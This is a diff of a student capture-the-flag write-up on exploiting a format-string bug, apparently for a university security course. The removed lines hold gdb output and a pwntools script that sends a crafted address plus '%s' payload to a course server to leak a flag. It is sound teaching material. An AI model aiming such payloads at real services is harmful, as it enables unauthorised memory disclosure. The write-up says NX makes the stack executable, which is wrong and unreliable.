@@ -4,90 +4,51 @@
 
 - We need to execute the command 'checksec program', in order to see the definition and information of the file **program**.
 
-[1. checksec command]('CTFs/Img/Semana7-Desafio1/ 1._checksec.png')
+![Terminal print of task 1 - checksec](CTFs/Img/Semana7-Desafio1/1.checksec.png)
 
 We can conclude that:
 
-- There is a _canary_ preventing the change of the return address of functions
-  (or at least making it harder)
-- The _stack_ has execution permission (NX) - We can execute code that we inject
-  (e.g.: shellcode)
+- There is a _canary_ preventing the change of the return address of functions. This canary has a certain values in the beginning of the execution of the function and is located right before the return value. Before it gets to the return address of the function, the _canary_ will compare the value that is at the end of the execution in the canary address with the value stored in the beginning of the execution. If it's different, the stack changed.
+- The _stack_ has execution permission (NX) - We can run files that we inject (example, shellcode instructions).
 - The position on the binary aren't randomized (PIE) - we can get the addresses
-  of variables/registers using a debugger.
-- There isn't a seperated stack (SafeStack) - _return addresses_ aren't
-  protected.
+  of variables/registers using a debugger, because the memeory address of all variables don't change.
 
 ### Qual é a linha do código onde a vulnerabilidade se encontra?
 
 ```c
 scanf("%32s", &buffer);
-(...)
-printf(buffer); // Vulnerability
+printf("You gave me this: ");
+printf(buffer); // vulnerability
 ```
 
 ### O que é que a vulnerabilidade permite fazer?
 
-The vulnerability allows us to read and write to variables/registers that we
-aren't supposed to, thus allowing us the read the **flag** global variable.
+This vulnerability allows us to read from and write to memory addresses that we arent't supposed to have permissons. As so, this allows us to read the **flag** global variable.
 
 ### Qual é a funcionalidade que te permite obter a flag?
 
 By using '%s' on `printf`'s format string, we can read the contents of the flag
 char array. To do this, we just need to obtain the address of said variable.
 
+Using the '%s? format string, we ca read the contents of the flag char array. In order to do this, we need the address of the variable flag.
+
+We will use the debugger gdb to get the address of the flag global variable.
+
 ### Flag's memory address
 
-```
-[11/24/21]seed@VM:~/CTF/6$ gdb program
-Reading symbols from program...
-(...)
-gdb-peda$ b load_flag
-Breakpoint 1 at 0x8049256: file main.c, line 8.
-gdb-peda$ run
-(...)
-Breakpoint 1, load_flag () at main.c:8
-8	void load_flag(){
-gdb-peda$ p &flag
-$1 = (char (*)[40]) 0x804c060 <flag>
-```
+![Terminal print of task 1 - _gdb_ debugger](CTFs/Img/Semana7-Desafio1/2.debugger-gdb.png)
 
-The address of the flag is `0x804c060`
+- As we can see in the picture above, the address of the flag global variable is **0x804c060**.
 
 ### Exploit
 
-```py
-#!/usr/bin/env python3
-from pwn import *
+![Terminal print of task 1 - exploit_example.py file](CTFs/Img/Semana7-Desafio1/3.exploitFile.png)
 
-LOCAL = False
+- Now, in order to get the flag, we just need to compile the exploit_example.py file and check the result flag.
 
-if LOCAL:
-    local = './program'
-    p = process(local)
-else:
-    url = 'ctf-fsi.fe.up.pt'
-    port = 4005
-    p = remote(url, port)
+![Terminal print of task 1 - result (flag)](CTFs/Img/Semana7-Desafio1/4.result_exploit_flag.png)
 
-p.recvuntil(b":")
-
-content = bytearray(0x00 for i in range(32))
-val = 0x0804c060
-content[0:4] = (val).to_bytes(4, byteorder='little')
-content[4:6] = ("%s").encode('latin-1')
-
-p.sendline(content)
-p.interactive()
-p.recvuntil(b"got:")
-p.sendline(b"hi")
-p.interactive()
-```
-
-`flag{5fc247063bea425edc863667ac9d09bc}`
-
-In this simple exploit, we store the address in the beginning of the array, and
-then use '%s' to read from that memory position. We only need 1 '%s', because
-`printf`'s pointer starts right on top of the buffer.
+`flag{5b54eade3016fad2273920d8064491}`
 
 ## Desafio #2
 
